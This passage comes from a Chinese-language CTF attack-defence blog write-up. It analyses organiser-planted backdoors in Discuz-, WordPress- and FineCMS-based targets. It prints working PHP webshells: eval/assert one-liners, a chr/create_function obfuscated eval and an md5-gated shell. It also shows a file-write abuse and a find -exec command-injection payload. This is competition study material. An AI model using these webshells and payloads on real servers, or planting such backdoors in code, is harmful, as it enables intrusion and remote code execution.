</span></span><span class=line><span class=cl>    <span class=s1>&#39;updatehosts&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;updateapps&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;updateclient&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;updatecredit&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;getcreditsettings&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;updatecreditsettings&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;writesth&#39;</span>
</span></span><span class=line><span class=cl><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$uc_note</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>uc_note</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=nv>$uc_note</span><span class=o>-&gt;</span><span class=nv>$get</span><span class=p>[</span><span class=s1>&#39;action&#39;</span><span class=p>](</span><span class=nv>$get</span><span class=p>,</span> <span class=nv>$post</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>(</span><span class=nx>API_RETURN_FAILED</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这个<code>array</code>就有个地方就显得特别的奇葩，那就是最后的<code>writesth</code>&mldr;</p><p>要是框架的作者&mldr;这么写怕不是会被打死&mldr;这里肯定就是主办方自己加上的。我们全局搜一下<code>writesth</code>看看都有些啥</p><p>果然找到一个函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>writesth</span><span class=p>(</span><span class=nv>$get</span><span class=p>,</span> <span class=nv>$post</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$cachefile</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>appdir</span> <span class=o>.</span><span class=nv>$get</span><span class=p>[</span><span class=s1>&#39;name&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nv>$fp</span> <span class=o>=</span> <span class=nx>fopen</span><span class=p>(</span><span class=nv>$cachefile</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$s</span> <span class=o>=</span> <span class=s2>&#34;&lt;?php</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$s</span> <span class=o>.=</span> <span class=nv>$get</span><span class=p>[</span><span class=s1>&#39;content&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nx>fwrite</span><span class=p>(</span><span class=nv>$fp</span><span class=p>,</span> <span class=nv>$s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>fclose</span><span class=p>(</span><span class=nv>$fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>API_RETURN_SUCCEED</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>换句话说，就是上传的文件名是你<code>get</code>请求的<code>name</code>，内容就是你的<code>content</code>参数，这里就可以制造一个<code>webshell</code>来打。</p><p>我们也可以测试一下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>writesth</span><span class=p>(</span><span class=nv>$name</span><span class=p>,</span> <span class=nv>$content</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$cachefile</span> <span class=o>=</span> <span class=s2>&#34;./&#34;</span><span class=o>.</span><span class=nv>$name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$fp</span> <span class=o>=</span> <span class=nx>fopen</span><span class=p>(</span><span class=nv>$cachefile</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$s</span> <span class=o>=</span> <span class=s2>&#34;&lt;?php</span><span class=se>\r\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$s</span> <span class=o>.=</span> <span class=nv>$content</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>fwrite</span><span class=p>(</span><span class=nv>$fp</span><span class=p>,</span> <span class=nv>$s</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>fclose</span><span class=p>(</span><span class=nv>$fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$name</span> <span class=o>=</span> <span class=s2>&#34;shell.php&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$content</span> <span class=o>=</span> <span class=s2>&#34;@eval(</span><span class=se>\$</span><span class=s2>_POST[zedd]);</span><span class=se>\n</span><span class=s2>?&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>writesth</span><span class=p>(</span><span class=nv>$name</span><span class=p>,</span><span class=nv>$content</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>本地成功拿到<code>shell</code>，<code>shell.php</code>内容为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=k>eval</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=nx>zedd</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>但是这里得注意写入的地方是否有权限，无权限的话得考虑向上层目录走一走。</p><h3 id=something-else>Something Else</h3><p>其他的一些，可以参照一叶飘零大佬的博客，也可以参照<a class=link href=https://www.cnblogs.com/newgold/archive/2016/04/13/5386600.html target=_blank rel=noopener>ECSHOP v2.7.3注入漏洞分析和修复</a>这个博客。总体来说还是一场比较有收获的AWD，也学习到了挺多知识。也是几乎过了一个月左右才来总结这次AWD&mldr;（哎哟这种拖延症真的是…写这篇基本靠回忆了&mldr;</p><h2 id=第二届红帽杯线下攻防大赛>第二届“红帽杯”线下攻防大赛</h2><p>主要还是参考一叶飘零大佬的<a class=link href=http://skysec.top/2018/05/27/2018RedHat-AD-Web/ target=_blank rel=noopener>wp</a>以及自己的一些亲身经历总结经验…（发现跟大佬的差距真的是大..2333</p><p>这里提一下，为了找到主办方的洞的话，可以下载主办方出的框架的对应的版本，然后进行<code>diff</code>，这样很快就可以找到主办方故意留下的洞。如果是整个项目比较的话啊，我还是比较推荐<code>BeyondCompare</code>的.</p><h3 id=web1>Web1</h3><h4 id=poc-1-1>Poc 1</h4><p>在<code>wp-admin/tools.php</code>下有一个主办方留下的洞：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$poc</span><span class=o>=</span><span class=s2>&#34;a#s#s#e#r#t&#34;</span><span class=p>;</span> <span class=nv>$poc_1</span><span class=o>=</span><span class=nx>explode</span><span class=p>(</span><span class=s2>&#34;#&#34;</span><span class=p>,</span><span class=nv>$poc</span><span class=p>);</span> <span class=nv>$poc_2</span><span class=o>=</span><span class=nv>$poc_1</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=nv>$poc_1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=nv>$poc_1</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>.</span><span class=nv>$poc_1</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=o>.</span><span class=nv>$poc_1</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span><span class=o>.</span><span class=nv>$poc_1</span><span class=p>[</span><span class=mi>5</span><span class=p>];</span> <span class=o>@</span><span class=nv>$poc_2</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;_&#39;</span><span class=p>]);</span>
</span></span></code></pre></td></tr></table></div></div><p><code>explode</code>的[解释用法][http://www.w3school.com.cn/php/func_string_explode.asp]</p><blockquote><p>array <strong>explode</strong> ( string <code>$delimiter</code> , string <code>$string</code> [, int <code>$limit</code> ] )</p><p>explode() 函数把字符串打散为数组。</p></blockquote><p>也可以直接<code>echo</code>看一下<code>$poc_2</code>就是<code>assert</code>，也就是<code>@assert($_POST['_'])</code>这个马。</p><h4 id=poc-2-1>Poc 2</h4><p>在<code>wp-login.php</code>下注意到如下代码，有<code>system</code>很可能是一个任意命令执行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>case</span> <span class=s1>&#39;debug&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=nv>$file</span> <span class=o>=</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;find /tmp -iname &#34;</span><span class=o>.</span><span class=nx>escapeshellcmd</span><span class=p>(</span><span class=nv>$file</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>首先我们先解释<code>addslashes()</code>这个函数的[基本用法][http://php.net/manual/zh/function.addslashes.php]</p><blockquote><p>string <strong>addslashes</strong> ( string <code>$str</code> )</p><p>addslashes — 使用反斜线引用字符串</p><p>返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（<em>&rsquo;</em>）、双引号（<em>"</em>）、反斜线（**）与 NUL（<strong>NULL</strong> 字符）。</p></blockquote><p>还有<code>escapeshellcmd()</code>的[基本用法][http://php.net/manual/zh/function.escapeshellcmd.php]</p><blockquote><p>string <strong>escapeshellcmd</strong> ( string <code>$command</code> )</p><p>escapeshellcmd — shell 元字符转义</p><p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a class=link href=http://php.net/manual/zh/function.exec.php target=_blank rel=noopener>exec</a> 或 <a class=link href=http://php.net/manual/zh/function.system.php target=_blank rel=noopener>system()</a> 函数，或者 <a class=link href=http://php.net/manual/zh/language.operators.execution.php target=_blank rel=noopener>执行操作符</a> 之前进行转义。</p><p>反斜线（\）会在以下字符之前插入： *&amp;#;`|*?~&lt;>^()[]{}$*, <em>\x0A</em> 和 <em>\xFF</em>。 <em>&rsquo;</em> 和 <em>"</em> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <em>%</em> 和 <em>!</em> 字符都会被空格代替。</p></blockquote><p>基本就是把引号什么的及其其他的给转义了的意思。</p><p><code>system</code>中要执行的就是在<code>/tmp</code>目录下查找<code>$_POST</code>的参数的文件。而且根据<code>find</code>的手册，我们可以知道它还有一个<code>exec</code>的参数。</p><blockquote><p>-exec  参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。</p><p>{}   花括号代表前面find查找出来的文件名。</p><p><code>iname</code>在这里指的是不区分大小写；<code>name</code>则为区分大小写</p><p>例如</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>find /etc -name <span class=s2>&#34;passwd*&#34;</span> -exec grep <span class=s2>&#34;root&#34;</span> <span class=o>{}</span> <span class=se>\;</span>
</span></span></code></pre></td></tr></table></div></div><p>这里是查找<code>/etc</code>下名为以<code>passwd</code>开头的文件中是否含有<code>root</code></p></blockquote><p>这里我们只需要随便穿一个文件名，再加上<code>-exec cat /flag ;</code>因为最后<code>;</code>是被<code>escapeshellcmd</code>给转义了，所以不需要加反斜杠。如果加上<code>-or</code>的话就相当于可以直接执行<code>-exec</code>后的命令。所以这里我们可以使用<code>payload</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>find /tmp -iname a -or -exec cat /flag/flag <span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>可以拿<code>php</code>本地测试一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=nv>$a</span> <span class=o>=</span> <span class=s2>&#34;a -or -exec cat /flag/flag ;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$file</span> <span class=o>=</span> <span class=nx>addslashes</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;find /tmp -iname &#34;</span><span class=o>.</span><span class=nx>escapeshellcmd</span><span class=p>(</span><span class=nv>$file</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><h4 id=poc-3-1>Poc 3</h4><p>在<code>index.php</code>下直接有一个暴露的小马</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>@</span><span class=k>eval</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;admin&#39;</span><span class=p>]);</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=poc-4>Poc 4</h4><p>在<code>class-wp-cachefile.php</code>中，详细分析见：[参考链接][https://github.com/bl4de/security_whitepapers/blob/master/RIPS_PHP_Security_Calendar_2017.md]</p><h4 id=eles>Eles</h4><p>抄了一个作业</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>script</span> <span class=nx>language</span><span class=o>=</span><span class=s2>&#34;PHP&#34;</span><span class=o>&gt;</span><span class=k>if</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=nx>guo</span><span class=p>])</span><span class=o>===</span><span class=s2>&#34;fe831851246d186db20c229fa19a0172&#34;</span><span class=p>){</span><span class=o>@</span><span class=k>eval</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=nx>power</span><span class=p>]);}</span><span class=o>&lt;/</span><span class=nx>script</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>基本就是也跟着拿这个马一样打别人&mldr;也算是后知后觉吧&mldr;后来只能打为数不多几个了吧&mldr;</p><p>主要是<code>web1</code>给的用户对<code>web</code>目录没有写的权限，当时没什么经验&mldr;不知道自己传个马打自己…这就很难受了&mldr;导致了<code>web1</code>被打穿了&mldr;以及还有不死马&mldr;</p><h3 id=web2>Web2</h3><p>这里不得不吐槽一下<code>web2</code>的<code>checker</code>机制，只放两个静态都能过<code>checker</code>，稳得不行&mldr;</p><h4 id=poc-1-2>Poc 1</h4><p>看到<code>/config/site</code>下有两个莫名其妙的命名的<code>php</code>文件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1.php
</span></span><span class=line><span class=cl>2.php
</span></span></code></pre></td></tr></table></div></div><p>一看就应该是某些马的存放位置咯</p><p>在<code>1.php</code>中可以看到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=s1>&#39;SITE_DOMAINS&#39;</span>                  <span class=o>=&gt;</span> <span class=s1>&#39;123sadccv=&gt;1)&amp;&amp;($_GET[a]($_GET[b]));exit();$a=array(a&#39;</span><span class=p>,</span> <span class=c1>//网站的其他域名
</span></span></span></code></pre></td></tr></table></div></div><p>很明显的位置<code>$_GET[a]($_GET[b])</code></p><h4 id=poc-2-2>Poc 2</h4><p><code>2.php</code>中：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$_uU</span><span class=o>=</span><span class=nx>chr</span><span class=p>(</span><span class=mi>99</span><span class=p>)</span><span class=o>.</span><span class=nx>chr</span><span class=p>(</span><span class=mi>104</span><span class=p>)</span><span class=o>.</span><span class=nx>chr</span><span class=p>(</span><span class=mi>114</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$_cC</span><span class=o>=</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>101</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>118</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>97</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>108</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>40</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>36</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>95</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>80</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>79</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>83</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>84</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>91</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>50</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>93</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>41</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>59</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$_fF</span><span class=o>=</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>99</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>114</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>101</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>97</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>116</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>101</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>95</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>102</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>117</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>110</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>99</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>116</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>105</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>111</span><span class=p>)</span><span class=o>.</span><span class=nv>$_uU</span><span class=p>(</span><span class=mi>110</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$_</span><span class=o>=</span><span class=nv>$_fF</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>,</span><span class=nv>$_cC</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nv>$_</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p><code>var_dump</code>可以看到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$_uU -&gt; string(3) &#34;chr&#34;
</span></span><span class=line><span class=cl>$_cC -&gt; string(16) &#34;eval($_POST[2]);&#34;
</span></span><span class=line><span class=cl>$_fF -&gt; string(15) &#34;create_function&#34;
</span></span></code></pre></td></tr></table></div></div><p>所以是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$_</span> <span class=o>=</span> <span class=nx>create_function</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>,</span><span class=k>eval</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=mi>2</span><span class=p>]));</span>
</span></span></code></pre></td></tr></table></div></div><p>可以直接用<code>POST 2=phpinfo();</code>使用</p><h4 id=poc-3-2>Poc 3</h4><p>在与官方的<code>fincms</code>对比下我们可以发现新增文件为<code>finecms/dayrui/config/config.class.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$config</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$config</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;param&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$config</span><span class=o>-&gt;</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;param&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>FinecmsConfig</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$config</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$path</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$filter</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$config</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>config</span> <span class=o>=</span> <span class=nv>$config</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=mi>123</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>getConfig</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>config</span> <span class=o>==</span> <span class=s2>&#34;&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nv>$config</span> <span class=o>=</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;Finecmsconfig&#39;</span><span class=p>])</span><span class=o>?</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;Finecmsconfig&#39;</span><span class=p>]</span><span class=o>:</span><span class=s2>&#34;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>SetFilter</span><span class=p>(</span><span class=nv>$value</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filter</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>foreach</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filter</span> <span class=k>as</span> <span class=nv>$filter</span><span class=p>){</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>                <span class=nv>$array</span> <span class=o>=</span> <span class=nx>is_array</span><span class=p>(</span><span class=nv>$value</span><span class=p>)</span><span class=o>?</span><span class=nx>array_map</span><span class=p>(</span><span class=nv>$filter</span><span class=p>,</span><span class=nv>$value</span><span class=p>)</span><span class=o>:</span><span class=nx>call_user_func</span><span class=p>(</span><span class=nv>$filter</span><span class=p>,</span><span class=nv>$value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>filter</span> <span class=o>=</span> <span class=k>array</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
